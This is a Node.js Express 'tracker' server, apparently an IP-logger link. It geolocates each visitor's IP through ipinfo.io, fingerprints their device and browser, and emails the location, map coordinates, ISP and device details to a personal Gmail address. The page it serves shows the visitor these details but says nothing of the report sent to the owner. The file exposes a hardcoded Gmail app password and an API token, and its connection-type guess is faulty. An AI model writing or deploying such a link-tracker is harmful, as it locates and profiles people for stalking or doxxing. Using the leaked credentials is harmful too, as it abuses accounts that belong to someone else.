const express = require('express');
const nodemailer = require('nodemailer');
const axios = require('axios');
const UAParser = require('ua-parser-js');
const app = express();

app.set('trust proxy', true);
const sessionStarts = {};

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'staysane.rz@gmail.com',
    pass: 'nvkq cudo ibhh usdr',
  },
});

app.use((req, res, next) => {
  const ip = req.ip;
  if (!sessionStarts[ip]) {
    sessionStarts[ip] = new Date();
  }
  next();
});

app.get('/', async (req, res) => {
  const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'] || '';
  const referrer = req.headers['referer'] || 'direct';
  const dnt = req.headers['dnt'] || 'Not specified';

  // Format the current timestamp
  const timestamp = {
    day: new Date().toLocaleString('en-US', { weekday: 'long' }),
    date: new Date().toLocaleString('en-US', { year: 'numeric', month: 'long', day: 'numeric' }),
    time: new Date().toLocaleString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true }),
    unix: Math.floor(Date.now() / 1000)
  };

  if (userAgent.includes('UptimeRobot')) {
    return res.status(204).end();
  }

  const parser = new UAParser(userAgent);
  const device = parser.getDevice();
  const os = parser.getOS();
  const browser = parser.getBrowser();
  const engine = parser.getEngine();
  const cpu = parser.getCPU();
  const deviceType = device.type || 'Unknown';

  const connectionType = inferConnectionType(req);
  const sessionStart = sessionStarts[ip];
  const sessionDuration = sessionStart ? `${Math.round((new Date() - sessionStart) / 1000)} seconds` : 'First visit';
  const pageViews = sessionStart ? 'Multiple' : 'First visit';

  // --- IPInfo Location ---
  let geoData = {
    combined: 'N/A',
    coords: null,
    isp: 'N/A',
    asn: 'N/A'
  };

  try {
    const ipinfoToken = '5cbabbc7ad7b57';
    const geo = await axios.get(`https://ipinfo.io/${ip}?token=${ipinfoToken}`);
    const { city, region, country, org, loc } = geo.data;

    geoData.combined = `${city}, ${region}, ${country}`;
    geoData.isp = org || 'N/A';
    geoData.asn = geo.data.asn || 'N/A';

    if (loc) {
      geoData.coords = loc.split(',');
    }
  } catch (err) {
    console.warn('IPInfo failed:', err.message);
  }

  // Send email (same as before)
  const mailOptions = {
    from: 'zyron',
    to: 'xraymundzyron@gmail.com',
    subject: 'Visitor accessed your URL',
    text: `New visit detected!\n\n== TIMESTAMP ==\nDay:  ${timestamp.day}\nDate: ${timestamp.date}\nTime: ${timestamp.time}\n\nIP Address: ${ip}\n\n== LOCATION ==\nLocation: ${geoData.combined}\nISP: ${geoData.isp}\nASN: ${geoData.asn}\nCoords: ${geoData.coords ? geoData.coords.join(', ') : 'N/A'}\nMap: https://www.google.com/maps?q=${geoData.coords ? geoData.coords.join(',') : ''}\n\n== DEVICE INFO ==\nDevice Type: ${deviceType}\nBrand: ${device.vendor || 'Unknown'}\nModel: ${device.model || 'Unknown'}\nOS: ${os.name || 'OS'} ${os.version || ''}\nBrowser: ${browser.name || 'Browser'} ${browser.version || ''}\nEngine: ${engine.name || 'Unknown engine'}\nCPU: ${cpu.architecture || 'Unknown CPU architecture'}\n\n== SESSION ==\nConnection: ${connectionType}\nDNT Header: ${dnt}\nSession Duration: ${sessionDuration}\nPage Views: ${pageViews}\nUser Agent: ${userAgent}\nReferrer: ${referrer}`
  };

  transporter.sendMail(mailOptions, (error) => {
    if (error) console.error('Email failed:', error);
  });

  // Send HTML response
  const htmlResponse = `
<!DOCTYPE html>
<html>
<head>
    <title>Visitor Information</title>
    <meta charset="UTF-8">
    <style>
        body {
            font-family: monospace;
            font-size: 14px;
            line-height: 1.5;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
            color: #333;
        }
        h2 {
            margin-top: 20px;
            margin-bottom: 10px;
            padding-bottom: 5px;
            border-bottom: 1px solid #ddd;
        }
        pre {
            background-color: #eee;
            padding: 10px;
            border-radius: 4px;
            overflow-x: auto;
        }
        a {
            color: #2563eb;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <h2 style="color: #2563eb;">=== 🌍 VISITOR DETAILS ===</h2>
    <p>🕒 <b>Date:</b> ${timestamp.day}, ${timestamp.date}</p>
    <p>🕒 <b>Time:</b> ${timestamp.time} <i>(PH Time)</i></p>
    <p>🕒 <b>Unix:</b> ${timestamp.unix}</p>

    <p>📍 <b>IP:</b> ${ip}</p>
    <p>📍 <b>Location:</b> ${geoData.combined}</p>
    <p>📍 <b>Coordinates:</b> ${geoData.coords ? geoData.coords.join(', ') : 'N/A'}</p>
    <p>📍 <b>Map:</b> <a href="https://www.google.com/maps?q=${geoData.coords ? geoData.coords.join(',') : ''}" target="_blank">View on Google Maps</a></p>
    <p>📡 <b>ISP:</b> ${geoData.isp}</p>
    <p>📡 <b>ASN:</b> ${geoData.asn}</p>

    <h2 style="color: #2563eb;">=== 💻 DEVICE INFO ===</h2>
    <p>📱 <b>Type:</b> ${deviceType}</p>
    <p>🏷️ <b>Brand:</b> ${device.vendor || 'Unknown'}</p>
    <p>🖥️ <b>Model:</b> ${device.model || 'Unknown'}</p>
    <p>💾 <b>OS:</b> ${os.name || 'OS'} ${os.version || ''}</p>
    <p>🌐 <b>Browser:</b> ${browser.name || 'Browser'} ${browser.version || ''}</p>
    <p>⚙️ <b>Engine:</b> ${engine.name || 'Unknown engine'}</p>
    <p>🧠 <b>CPU:</b> ${cpu.architecture || 'Unknown CPU architecture'}</p>

    <h2 style="color: #2563eb;">=== 🔗 NETWORK ===</h2>
    <p>📶 <b>Connection:</b> ${connectionType}</p>
    <p>🚫 <b>DNT Header:</b> ${dnt}</p>
    <p>🔗 <b>Referrer:</b> ${referrer}</p>

    <h2 style="color: #2563eb;">=== 📊 SESSION ===</h2>
    <p>⏱️ <b>Duration:</b> ${sessionDuration}</p>
    <p>📊 <b>Page Views:</b> ${pageViews}</p>

    <h2 style="color: #2563eb;">=== 🕵️ USER AGENT ===</h2>
    <pre>${userAgent}</pre>
</body>
</html>
  `;

  res.send(htmlResponse);
});

function inferConnectionType(req) {
  const ip = req.ip;
  if (ip.startsWith('192.') || ip.startsWith('172.16.') || ip.startsWith('10.')) {
    return 'Likely Mobile (Cellular)';
  }
  return 'Likely WiFi/Landline';
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Tracker running on port ${PORT}`));